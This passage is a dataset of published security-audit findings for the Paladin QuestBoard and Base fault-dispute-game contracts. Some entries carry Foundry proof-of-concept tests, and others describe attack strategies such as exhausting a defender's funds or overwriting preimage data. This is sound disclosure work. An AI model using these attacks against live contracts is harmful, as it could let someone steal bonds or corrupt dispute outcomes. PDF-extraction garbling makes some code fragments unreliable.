nonReentrant modifier in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions claim(), claimQuest() and recoverERC20() of contract MultiMerkleDistributor send tokens but dont have a nonReentrant modifier. All other functions that send tokens do have this modifier. Note: as the checks & effects patterns is used this is not really necessary. function claim(...) public { ... IERC20(rewardToken).safeTransfer(account, amount); } function claimQuest(...) external { ... IERC20(rewardToken).safeTransfer(account, totalClaimAmount); } function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Place struct definition at the beginning of the contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Regarding Solidity Style Guide, the struct definition can move to the beginning of the contract.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Improve checks for past quests in increaseQuestReward() and increaseQuestObjective()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions increaseQuestReward() and increaseQuestObjective() check: newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote. This is true when the quest is in the past (e.g. currentPeriod is outside of the quest range), because all the values will be 0. Luckily execution is stopped at _getRemainingDuration(questID), however it would be more logical to put this check near the start of the function. function increaseQuestReward(...) ... { updatePeriod(); ... require(newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote, \"QuestBoard: New reward must be higher\"); ... uint256 remainingDuration = _getRemainingDuration(questID); require(remainingDuration > 0, \"QuestBoard: no more incoming QuestPeriods\"); ... ,! } The function _getRemainingDuration() reverts when the quest is in the past, as currentPeriod will be larger than lastPeriod. The is not what you would expect from this function. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; return (lastPeriod - currentPeriod) / WEEK; // can revert }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Should make use of token.balanceOf(address(this)); to recover tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Currently when calling the recoverERC20() function there is no way to calculate what the proper amount should be without having to check the contracts balance of token before hand. This will require an extra step and can be easily done inside the function itself.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Floating pragma is set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The current pragma Solidity directive is ^0.8.10. It is recommended to specify a specific compiler version to ensure that the byte code produced does not vary between builds. Contracts should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.8.10) ensures that contracts do not accidentally get deployed using an older compiler version with known compiler bugs.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Deflationary reward tokens are not handled uniformly across the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The code base does not support rebasing/deflationary/inflationary reward tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Typo on comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Across the codebase, there is a typo on the comment. The comment can be seen from the below. * @dev Returns the number of periods to come for a give nQuest", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Require statement with gauge_types function call is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The gauge_types function of the Curve reverts when an invalid gauge is given as a parameter, the QuestBoard: Invalid Gauge error message will not be seen in the QuestBoard contract. The documentation can be seen from the Querying Gauge and Type Weights. function createQuest(...) ... { ... require(IGaugeController(GAUGE_CONTROLLER).gauge_types(gauge) >= 0, \"QuestBoard: Invalid Gauge\"); ... }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Missing setter function for the GAUGE_CONTROLLER", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The GAUGE_CONTROLLER address is immutable and set in the constructor. If Curve adds a new version of the gauge controller, the value of GAUGE_CONTROLLER cannot be updated and the contract QuestBoard needs to be deployed again. address public immutable GAUGE_CONTROLLER; constructor(address _gaugeController, address _chest){ GAUGE_CONTROLLER = _gaugeController; ... }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Empty events emitted in killBoard() and unkillBoard() functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "When an event is emitted, it stores the arguments passed in for the transaction logs. Currently the Killed() and Unkilled() events are emitted without any arguments passed into them defeating the purpose of using an event.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "PreimageOracle.loadPrecompilePreimagePart an outOfGas error in the precompile will overwrite cor- rect preimageParts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "Alexis Williams from Coinbase initially identified this issue in the loadPrecompilePreimagePart function during the engagement with Spearbit. The function calls any _precompile passed as a parameter for a given _input. function loadPrecompilePreimagePart( uint256 _partOffset, address _precompile, bytes calldata _input ) external The _partOffset variable defines which 32 bytes of the precompile returned result will be stored in a preim- ageParts mapping. The key for the mapping is based on a keccak hash, including the _precompile address and _input parameter. The function is public and can be called multiple times. A call with the same parameters should produce again the same key and state updates. If the precompile call reverts, the returned error would be stored in the preimageParts mapping instead. The transaction itself would be successful (see the related test). An attacker could call loadPrecompilePreimagePart with less gas to produce an outOfGas error in the precom- pile. The 63/64 gas rule applies for staticcall and precompiles even when all the available gas() passed as parameter. // Call the precompile to get the result. res := staticcall( gas(), // forward all gas _precompile, add(20, ptr), // input ptr _input.length, 0x0, // Unused as we don  0x00 // don t copy anything  t copy anything ) The loadPrecompilePreimagePart function can have enough gas left to update preimageParts mapping with the outOfGas error. This means a successful preimage result can be overwritten with the outOfGas error for some _partOffset in the preimageParts mapping. Given that the correct preimageParts mapping is needed to reproduce the VM.step in a FaultDisputeGame.step it can lead to an incorrect outcome.", "labels": ["Spearbit", "Base", "Severity: Medium Risk"]}, {"title": "Invalid Ancestor Lookup Leading to Out-of-Bounds Array Access", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "When finding an ancestor via the _findTraceAncestor function, the code allows specifying the global flag, which limits the ancestor search to the split depth. When _global is set to false the function uses the _pos.traceAncestorBounded(SPLIT_DEPTH) method. This method violates an invariant assumption: \"It is guaranteed that such a claim exists.\" In scenarios when SPLIT_DEPTH + 1 = MAX_DEPTH. The code, will not be able to find a right-side node, causing the code to loop until reaching the root node. The root node, containing type(uint32).max as its parentIndex, results in an out-of-bounds array access. This issue specifically arises when the last game step is a defend action. Proof of concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import { Test } from \"forge-std/Test.sol\"; import \"../../src/dispute/AnchorStateRegistry.sol\"; import \"../../src/dispute/DisputeGameFactory.sol\"; import \"../../src/dispute/FaultDisputeGame.sol\"; import \"../../src/dispute/lib/LibUDT.sol\"; // oz clones library import \"@openzeppelin/contracts/proxy/Clones.sol\"; contract WETHMock { // balances uint256 totalBalance; mapping(address => uint256) public unlocks; function deposit() external payable { totalBalance += msg.value; 5 } function withdraw(uint256 amount) external { // check unlocks require(unlocks[msg.sender] >= amount, \"WETHMock: insufficient unlocks\"); totalBalance -= amount; payable(msg.sender).transfer(amount); } function unlock(address to, uint256 amount) external { unlocks[to] += amount; } } contract POC is Test { using Clones for address; AnchorStateRegistry internal anchorStateRegistry; DisputeGameFactory internal disputeGameFactory; WETHMock internal weth; address constant ADMIN = address(0x1); function setUp() public { disputeGameFactory = DisputeGameFactory(address(new DisputeGameFactory()).clone()); anchorStateRegistry = AnchorStateRegistry(address(new ,! AnchorStateRegistry(disputeGameFactory)).clone()); disputeGameFactory.initialize(ADMIN); weth = new WETHMock(); } function test_oob_in_findTraceAncestor() public { vm.startPrank(ADMIN); disputeGameFactory.setImplementation( GameType.wrap(0), IDisputeGame(address(new FaultDisputeGame( GameType.wrap(0), // _gameType Claim.wrap(0x0), // _absolutePrestate 2, // _maxGameDepth (max) 1, // _splitDepth Duration.wrap(200), // _clockExtension Duration.wrap(1000), // _maxClockDuration IBigStepper(address(0)), // _vm IDelayedWETH(address(weth)), // _weth IAnchorStateRegistry(address(anchorStateRegistry)), // _anchorStateRegistry 0x123 // _l2ChainId ))) ); vm.stopPrank(); bytes32 anchorRoot = bytes32(uint256(0x1234)); uint256 l2BlockNumber = 0x10; AnchorStateRegistry.StartingAnchorRoot[] memory startingAnchorRoots = new ,! AnchorStateRegistry.StartingAnchorRoot[](1); startingAnchorRoots[0] = AnchorStateRegistry.StartingAnchorRoot({ 6 gameType: GameType.wrap(0), outputRoot: OutputRoot({ root: Hash.wrap(anchorRoot), l2BlockNumber: l2BlockNumber }) }); anchorStateRegistry.initialize( startingAnchorRoots ); uint256 gameL2BlockNumber = 0x11; bytes32 rootClaim = bytes32(uint256(0x1234)); bytes memory extraData = abi.encodePacked(gameL2BlockNumber); FaultDisputeGame game = FaultDisputeGame(address(disputeGameFactory.create( GameType.wrap(0), Claim.wrap(rootClaim), extraData ))); Position disputePosition = Position.wrap(2); // 2 because we attack 1 uint256 amount = game.getRequiredBond(disputePosition); vm.deal(address(0x1), 100 ether); vm.deal(address(0x2), 100 ether); vm.deal(address(0x3), 100 ether); vm.deal(address(0x4), 100 ether); // index 1 vm.prank(address(0x1)); game.move{value: amount}( Claim.wrap(bytes32(uint256(rootClaim))), 0, Claim.wrap(bytes32(uint256(0x2222))), true ); disputePosition = Position.wrap(4); // 4 because we attack 2 amount = game.getRequiredBond(disputePosition); // index 2 vm.prank(address(0x2)); game.move{value: amount}( Claim.wrap(bytes32(uint256(0x2222))), 1, Claim.wrap(bytes32(uint256(1 << 248 | 0x4444))), true ); vm.prank(address(0x3)); game.step( 2, false, \"\", \"\" ); } 7 } Stack Trace: ... [0] console::log(\"traceAncestorPos\", 5) [staticcall] (cid:24) [Stop] [0] console::log(\"ancestor.parentIndex\", 0) [staticcall] (cid:24) [Stop] [0] console::log(\"ancestor.parentIndex\", 4294967295 [4.294e9]) [staticcall] (cid:24) [Stop] (cid:24) [Revert] panic: array out-of-bounds access (0x32) (cid:24) [Revert] panic: array out-of-bounds access (0x32) (cid:24) [Revert] panic: array out-of-bounds access (0x32) Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.31ms (2.44ms CPU time) Ran 1 test suite in 8.02s (7.31ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests) Failing tests: Encountered 1 failing test in test/cryptara/OOB_find.sol:POC [FAIL. Reason: panic: array out-of-bounds access (0x32)] test_oob_in_findTraceAncestor() (gas: 6970940)", "labels": ["Spearbit", "Base", "Severity: Medium Risk"]}, {"title": "An attacker with more available funds can counter an honest rootClaim defender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "An attacker (challenger) with more funds available than an honest rootClaim defender can win the Game with the status CHALLENGER.WINS even if the rootClaim provided by the honest defender is correct. The attacker only needs to win one subgame that goes uncountered to counter the rootClaim. This can be achieved by opening so many subGames with different incorrect claims at the same gameTree level until the honest defender runs out of funds. The attacker would open new games at the same level (tree depth) instead of continuing to play the existing subgames closer to the leaves. Once the honest defender has no funds left, one subgame win by the attacker due to opponent timeout is enough to counter the correct rootClaim. We want to point out, that these are the technical mechanisms by which the honest defender would loss the rootSubGame. From a game-theoretical perspective such an attack would cost a lot of money, since all opened subgames with incorrect claims if countered by the honest defender would result in a loss for the attacker. The attacker could theoretically win the entire TVL available on the L2 and might be willing to lose a lot of subgames. 8 On the other hand, anyone can support the honest defender team because it is free money to win and should incentivise to provide the required liquidity. The other parties owning the TVL on the L2 have an incentive as well to protect it.", "labels": ["Spearbit", "Base", "Severity: Medium Risk"]}, {"title": "challengeRootL2Block can be abused to block honest gamer from receiving the bond.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "In DisputeGame, if the function challengeRootL2Block is called successfully, the challenger wins the root claim subgame and can receive the bond: receive // Issue a special counter to the root claim. This counter will always win the root claim subgame, and ,! // the bond from the root claimant. l2BlockNumberChallenger = msg.sender; l2BlockNumberChallenged = true; When the root claim subgame is resolved, the priority of bond receiver goes to the l2BlockNumberChallenger address: // Distribute the bond to the appropriate party. if (_claimIndex == 0 && l2BlockNumberChallenged) { // Special case: If the root claim has been challenged with the // the bond is always paid out to the issuer of that challenge. address challenger = l2BlockNumberChallenger; _distributeBond(challenger, subgameRootClaim); subgameRootClaim.counteredBy = challenger; } else {  challengeRootL2Block function,  // If the parent was not successfully countered, pay out the parent // If the parent was successfully countered, pay out the parent _distributeBond(countered == address(0) ? subgameRootClaim.claimant : countered, subgameRootClaim); s bond to the challenger. s bond to the claimant.   // Once a subgame is resolved, we percolate the result up the DAG so subsequent calls to // resolveClaim will not need to traverse this subgame. subgameRootClaim.counteredBy = countered; } But consider that a malicious user proposes an output claim with an invalid l2 block number, an honest gamer makes a challenge by constructing payload via attack and step function, then the honest gamer should be entitled to receive the bond. However, the malicious user spots the challenge and realizes he will lose their bond, they can always call chal- lengeRootL2Block to win the root subgame, while the dispute game cannot be used to verify the withdraw trans- action, the challengeRootL2Block function is abused to block the honest gamer from receiving the bond.", "labels": ["Spearbit", "Base", "Severity: Medium Risk"]}, {"title": "FaultDisputeGame.step function can be called after parentClaim is resolved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The step function does not check the chess clock time. This means that the MAX_CLOCK_DURATION could already have been reached and the parent claim could already be resolved as uncountered. The step function would be executed successfully and would overwrite the parent.counteredBy = msg.sender; but with no impact, since the the parent subgame has been already resolved. The msg.sender would not receive a reward, since the payout already did happen.", "labels": ["Spearbit", "Base", "Severity: Low Risk"]}, {"title": "challengeRootL2Block called between resolveClaim and resolve would result in incorrect GameSta- tus and state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "If the defender of the rootClaim proposed an incorrect l2BlockNumber() anyone can challenge this by calling challengeRootL2Block by providing the preimage of the output root together with L2 block header to proof that l2BlockNumber is incorrect. A successful challengeRootL2Block should always lead to the following outcome:  After final resolve of the game: GameStatus.CHALLENGER_WINS;  The caller of the challengeRootL2Block should receive the bond from the root sub game. The l2BlockNumberChallenger = msg.sender; // caller of l2BlockNumberChallenged = true;  challengeRootL2Block  Problem: If the called between resolveClaim and resolve. The resolvedSubgames[0] is already resolved. The implications would be GameStatus can be CHALLENGER_WINS or DEFENDER_WINS independent of the chal- lengeRootL2Block outcome. The caller of challengeRootL2Block would receive no rewards, since the payout already happend. However, the status would still updated for l2BlockNumberChallenger and l2BlockNumberChallenged. This can lead to the final game state which should never be the case: l2BlockNumberChallenged = true; status = GameStatus.DEFENDER_WINS;", "labels": ["Spearbit", "Base", "Severity: Low Risk"]}, {"title": "Extension period not applied correctly for next root when SPLIT_DEPTH is set to 1 or less", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "When SPLIT_DEPTH is set to 1, the extension period for the next root is not considered, resulting in the root claim not receiving the intended extension time. This occurs because the calculation SPLIT_DEPTH - 1 results in 0, leading to the nextPositionDepth value being 0, and hence no extension period is applied. This discrepancy results in the subgame root at position 2 having a normal extension period instead of the extended time it should receive. Moreover, if the SPLIT_DEPTH is set to 0, the SPLIT_DEPTH - 1 statement will underflow and always revert, leaving the state unusable until the clock time expires. Proof of concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import { Test } from \"forge-std/Test.sol\"; import \"../../src/dispute/AnchorStateRegistry.sol\"; import \"../../src/dispute/DisputeGameFactory.sol\"; import \"../../src/dispute/FaultDisputeGame.sol\"; import \"../../src/dispute/lib/LibUDT.sol\"; // oz clones library import \"@openzeppelin/contracts/proxy/Clones.sol\"; contract WETHMock { // balances uint256 totalBalance; mapping(address => uint256) public unlocks; function deposit() external payable { totalBalance += msg.value; } function withdraw(uint256 amount) external { // check unlocks require(unlocks[msg.sender] >= amount, \"WETHMock: insufficient unlocks\"); totalBalance -= amount; payable(msg.sender).transfer(amount); } 11 function unlock(address to, uint256 amount) external { unlocks[to] += amount; } } contract POC is Test { using Clones for address; AnchorStateRegistry internal anchorStateRegistry; DisputeGameFactory internal disputeGameFactory; WETHMock internal weth; address constant ADMIN = address(0x1); function setUp() public { disputeGameFactory = DisputeGameFactory(address(new DisputeGameFactory()).clone()); anchorStateRegistry = AnchorStateRegistry(address(new ,! AnchorStateRegistry(disputeGameFactory)).clone()); disputeGameFactory.initialize(ADMIN); weth = new WETHMock(); } function test_valid_game_split_1_no_duration() public { vm.startPrank(ADMIN); disputeGameFactory.setImplementation( GameType.wrap(0), IDisputeGame(address(new FaultDisputeGame( GameType.wrap(0), // _gameType Claim.wrap(0x0), // _absolutePrestate 5, // _maxGameDepth (max) 1, // _splitDepth Duration.wrap(200), // _clockExtension Duration.wrap(1000), // _maxClockDuration IBigStepper(address(0)), // _vm IDelayedWETH(address(weth)), // _weth IAnchorStateRegistry(address(anchorStateRegistry)), // _anchorStateRegistry 0x123 // _l2ChainId ))) ); vm.stopPrank(); bytes32 anchorRoot = bytes32(uint256(0x1234)); uint256 l2BlockNumber = 0x10; AnchorStateRegistry.StartingAnchorRoot[] memory startingAnchorRoots = new ,! AnchorStateRegistry.StartingAnchorRoot[](1); startingAnchorRoots[0] = AnchorStateRegistry.StartingAnchorRoot({ gameType: GameType.wrap(0), outputRoot: OutputRoot({ root: Hash.wrap(anchorRoot), l2BlockNumber: l2BlockNumber }) }); 12 anchorStateRegistry.initialize( startingAnchorRoots ); uint256 gameL2BlockNumber = 0x11; bytes32 rootClaim = bytes32(uint256(0x1234)); bytes memory extraData = abi.encodePacked(gameL2BlockNumber); FaultDisputeGame game = FaultDisputeGame(address(disputeGameFactory.create( GameType.wrap(0), Claim.wrap(rootClaim), extraData ))); bytes32 disputeClaim = bytes32(uint256(rootClaim)); // MUST be the same uint256 disputeIndex = 0; bytes32 disputeNextClaim = bytes32(uint256(0x5678)); bool disputeIsAttack = true; Position disputePosition = Position.wrap(2); // 2 because we attack 1 uint256 amount = game.getRequiredBond(disputePosition); vm.warp(1000); // This is 1 second away to exhaust the clock, should give at least Extension ,! time Duration _nextDuration = game.getChallengerDuration(0); console.log(\"Max Clock Duration: %d\", 1000); console.log(\"Clock Extension: %d\", 200); if(_nextDuration.raw() > 1000 - 200) { console.log(\"Not enough time, we need to increase the clock by extension\"); } ( , , , , , Position position, Clock clock ) = game.claimData(0); Position nextPosition = position.move(disputeIsAttack); uint256 nextPositionDepth = nextPosition.depth(); console.log(\"Next Position Depth: %d\", nextPositionDepth); // Since next position depth is 1, the next position will have no time extension. game.move{value: amount}( Claim.wrap(disputeClaim), disputeIndex, Claim.wrap(disputeNextClaim), disputeIsAttack ); ( , , , , , , Clock clockNew ) = game.claimData(1); console.log(\"Clock New duration: %d\", clockNew.duration().raw()); 13 // The expected duration should be bigger than a normal clock extension // as the next position is a root claim of a bisection sub-game. } }", "labels": ["Spearbit", "Base", "Severity: Low Risk"]}, {"title": "Inconsistent _partOffset check and memory boundaries in loadLocalData function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The loadLocalData function in the PreimageOracle contract has a parameter called _partOffset used to read data from memory after it has been prepared. There are inconsistencies and potential issues with this implementation: 1. Inconsistent _partOffset Handling:  The _partOffset parameter is handled inconsistently compared to other parts of the code. For in- stance, _partOffset == 40 is allowed here but not elsewhere, where the assembly code checks via iszero(lt(_partOffset, 0x28)). This inconsistency can lead to scenarios where _partOffset val- ues are valid in one context but not in another.  The current offset check uses _partOffset > _size + 8. This should be _partOffset >= _size + 8 to correctly prevent out-of-bounds access. 2. Memory Boundaries:  The function is designed to operate within the scratch space in memory, ranging from 0x00 to 0x40. The free memory pointer begins at position 0x40. Since the highest possible _partOffset is 0x28, an mload operation would read 32 bytes from 0x28 to 0x48, including the highest bytes of the free memory pointer, which are not used. This can lead to potential issues when reading parts of the free memory pointer.", "labels": ["Spearbit", "Base", "Severity: Low Risk"]}, {"title": "Preimage proposals can be initialized multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "initLPP() doesn't check if a proposal already exists, allowing multiple initialisations with the same _uuid. Since the proposalBonds is assigned to msg.value instead of incremented, this would result in loss of funds.", "labels": ["Spearbit", "Base", "Severity: Low Risk"]}, {"title": "_clockExtension and _maxClockDuration are not validated correctly in DisputeGame constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "In the constructor of the dispute game, the code validates that the clock extension cannot exceed the max clock duration: // The clock extension may not be greater than the max clock duration. if (_clockExtension.raw() > _maxClockDuration.raw()) revert InvalidClockExtension(); But when the clock extension is granted, If the potential grandchild is an execution trace bisection root, the clock extension is doubled: uint64 extensionPeriod = nextPositionDepth == SPLIT_DEPTH - 1 ? CLOCK_EXTENSION.raw() * 2 : CLOCK_EXTENSION.raw(); nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod); If the max duration is set to 7 days, but the clock extension is set to 4 days, when the clock extension is doubled to 8 days, the move transaction will revert, because 7 days - 8 days when extending the clock. nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod);", "labels": ["Spearbit", "Base", "Severity: Low Risk"]}, {"title": "Add more integration tests with Big Stepper VM execution for DisputeGame#step", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "When a step function is called in dispute game, the user may need to pass in the proof bytes. However, in the test case, the proof bytes are always empty when calling dispute game step function to resolve a claim. The test passes, but the mock test AlphabetVM does not consume the proof data: /// @title AlphabetVM /// @dev A mock VM for the purpose of testing the dispute game infrastructure. Note that this only works /// for games with an execution trace subgame max depth of 3 (8 instructions per subgame). contract AlphabetVM is IBigStepper { And the comments explicitly mention the mock VM only works for games with an execution trace subgame max depth of 3 (8 instructions per subgame).", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "FaultDisputeGame no existing tests for subgames resolution at the same leftmostPosition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The resolution in the FaultDisputeGame follows the rule of the leftmost child subgame which is uncountered should win the subgame.   // If the child subgame is uncountered and further left than the current left-most counter, // update the parent subgame // The left-most correct counter is preferred in bond payouts in order to discourage attackers // from countering invalid subgame roots via an invalid defense position. As such positions // cannot be correctly countered. // Note that correctly positioned defense, but invalid claimes can still be successfully countered. if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() > claim.position.raw()) { address and the current leftmostCounter countered    . s checkpoint.counteredBy = claim.claimant; checkpoint.leftmostPosition = claim.position; } In case multiple child subgames exists at the same position.raw the one with a lower index in challengeIndices would be iterated first by the loop and would be considered. uint256[] storage challengeIndices = subgames[_claimIndex]; Therefore, the honest challenger should always continue to play with the leftmost position, if at the same position the child subgame with a lower challengeIndices. However, this part doesn't seem to be tested. The condition can be changed to the opposite (The one with the highest challengeIndices should win if the position is the same, the loop would overwrite the checkpoint for the same position). - if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() = claim.position.raw()) + if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() >= claim.position.raw()) All tests would still pass.", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "honest defender with limited funds can lose all their ETH if they play with the wrong game strategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "Each move in a FaultDisputeGame requires an additional deposit. It is not true that an honest defender would always win and receive their funds back, plus the bonds of the opponent player if their budget is limited. If the honest defender follows the most intuitive strategy of: If a challenger opens a new subgame with an incorrect claim, the defender should immediately counter it as long as they have enough funds. An attacker could open multiple subgames at the same level but with different incorrect claims until the defender runs out of funds. Afterwards, the attacker could move against all the defender subgames. The defender would have no funds to continue and would lose all their games by timeout.", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Simpler clean highest byte operation for PreimageOracle and PreimageKeylib", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The PreimageOracle uses the highest byte of a key to indicate the type. Before the the type can be set it is required to set the highest byte to zero. This operation happens multiple in the PreimageOracle and in the PreimageKeylib. This is currently done with a bit mask which first needs to be generated. and(h, not(shl(248, 0xFF)))", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "FaultDisputeGame.step incorrect comment about number of leaves calculation for each execution trace subgame", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The comment preStateClaim for the leftmost leaf of each execution trace subgame. in FaultDisputeGame.sol incorrectly describes the condition for determining 18  s index at depth is 0, the prestate is the absolute // If the step position // prestate. // If the step is an attack at a trace index > 0, the prestate exists elsewhere in // the game state. // NOTE: We localize the // // // preStateClaim = (stepPos.indexAtDepth() % (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH))) == 0 ? ABSOLUTE_PRESTATE : _findTraceAncestor(Position.wrap(parentPos.raw() - 1), parent.parentIndex, false).claim; the remainder of the index at depth divided by 2 ** (MAX_GAME_DEPTH - SPLIT_DEPTH), which is the number of leaves in each execution trace subgame. This is so that we can determine whether or not the step position is represents the for the current execution trace subgame by finding ABSOLUTE_PRESTATE indexAtDepth   .   The correct calculation for the number of leaves in the execution trace trees should be: (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH - 1)) The execution trace roots are located at SPLIT_DEPTH + 1, making the current calculation (1 << (MAX_GAME_- DEPTH - SPLIT_DEPTH)) double the actual number of leaf nodes. However, the stepPos here is already one level below the MAX_GAME_DEPTH at MAX_GAME_DEPTH + 1. The current implementation works correctly because the stepPos in an attack case is double the parentPos. // gindex of nextStep in attack scenario stepPos = parentPos * 2; Therefore, the left and right side of the modulo operator will be double the amount and compute the correct result in the modulo equals zero case. Example: For MAX_GAME_DEPTH = 4 and SPLIT_DEPTH = 2:  Correct number of leaves: 2 ** (4-2-1) = 2 and not 4.  Current implementation works correctly because (x % 2) == (2x % 4) holds true if x % 2 == 0. General Form x mod y = (2x) mod (2y) The condition holds true if and only if x mod y = 0.", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Discrepancies in handling extraData in dispute game", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The current arbitrary-length extraData. However, the dispute game treats this extraData as a single 32-byte value for the l2BlockNumber. There are several discrepancies and areas for improvement: 1. Offset Descriptions: The factory uses non-hexadecimal numbers for offset descriptions, while the fault game uses hexadecimal numbers. This inconsistency can lead to confusion. 2. Handling extraData: If more than 32 bytes of extraData is passed, only the first 32 bytes corresponding to l2BlockNumber are fetched. The code should use return _getArgBytes()[0x54:] to return all the extraData. 19 3. initialize Function", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Optimize check order to revert early for cost-efficient execution", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The referenced lines have checks that can be performed earlier, before external calls and state updates. This would avoid wasting unnecessary gas from these checks' failures.  In dispute game step function, if a parent claim is already countered, the user cannot counter the claim again by changing the msg.sender: // INVARIANT: A step cannot be made against a claim for a second time. if (parent.counteredBy != address(0)) revert DuplicateStep(); // Set the parent claim as countered. We do not need to append a new claim to the game; // instead, we can just set the existing parent as countered. parent.counteredBy = msg.sender; The check runs after the VM.step executes. It is recommended to move this check before running the claim verification and vm execution logic.  In PreimageOracle loadBlobPreimagePart function, it is recommended to move the _partOffset validation logic before validating the KZG proof.  In PreimageOracle addLeavesLPP function, it is recommended to move the number of bytes processed and claimed size validation logic before extracting the Preimage Part logic.", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Theoretical MAX_POSITION_BITLEN is larger", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The MAX_POSITION_BITLEN in the LibPosition library is currently set to 126. However, given that the maximum index for a given depth is determined by 2depth (cid:0) 1, and the depth can be increased up to 127, the MAX_POSITION_BITLEN can theoretically be set to 127. This change would ensure the maximum depth and index fits within the bounds of a 128-bit value. 2depth + 2depth (cid:0) 1 (cid:20) 2128 (cid:0) 1 depth + 1 (cid:20) 128 depth (cid:20) 127", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Unexpected index notation in libraries", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The LibClock, GameId and LPPMetadataLib libraries describe the layout of packed data using MSb (Most Significant bit) notation, which can be confusing given Ethereum's data can span up to 256 bits. The description should use LSb (Least Significant bit) notation to align with common practices and improve readability. Specifically, describing the layout as bits 0-64 for the timestamp and bits 64-128 for the duration will help in understanding and ensuring consistency with the shr and shl operations used in the code. Change index notation from Msb to Lsb: N(cid:0)1 X i=0 bi 